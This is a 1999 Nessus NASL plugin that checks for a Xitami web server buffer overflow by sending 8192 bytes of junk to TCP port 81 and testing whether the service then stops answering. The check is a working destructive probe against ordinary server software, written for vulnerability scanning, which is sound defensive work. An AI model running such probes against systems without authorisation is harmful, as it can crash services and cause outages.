#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added a source reference link on www.securiteam.com

if(description)
{
 script_id(10322);
 script_version ("$Revision: 1.11 $");
 
 name["english"] = "Xitami Web Server buffer overflow";
 name["francais"] = "Dépassement de buffer dans le serveur web Xitami";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It is possible to make the remote web server execute
arbitrary code by sending a lot of data on the remote
TCP port 81.
	
This problem may allow an attacker to execute arbitrary code on
the remote system or create a denial of service.

Solution : None at this time. Contact Xitami

Reference : http://www.securiteam.com/exploits/3F5QLPPQ1A.html

Risk factor : High";

 desc["francais"] = "Il est possible de faire executer du code arbitraire
à un serveur faisant tourner Xitami en lui envoyant la
commande suivante en lui envoyant beaucoup de données
aléatoires.
	
Ce problème peut permettre à un pirate d'executer du
code arbitraire sur le système distant, ou de mettre
le système hors-service.

Solution : Aucune. Utilisez un autre serveur web
Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Xitami buffer overflow";
 summary["francais"] = "Dépassement de buffer dans Xitami";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports(81);
 exit(0);
}

#
# The script code starts here
#


port = 81;
if(get_port_state(port))
{
 data = crap(8192);
 soc = open_sock_tcp(port);
 if(soc > 0)
 {
  send(socket:soc, data:data);
  close(soc);
  soc2 = open_sock_tcp(port);
  if(!soc2)security_hole(port);
  else close(soc2);
 }
}
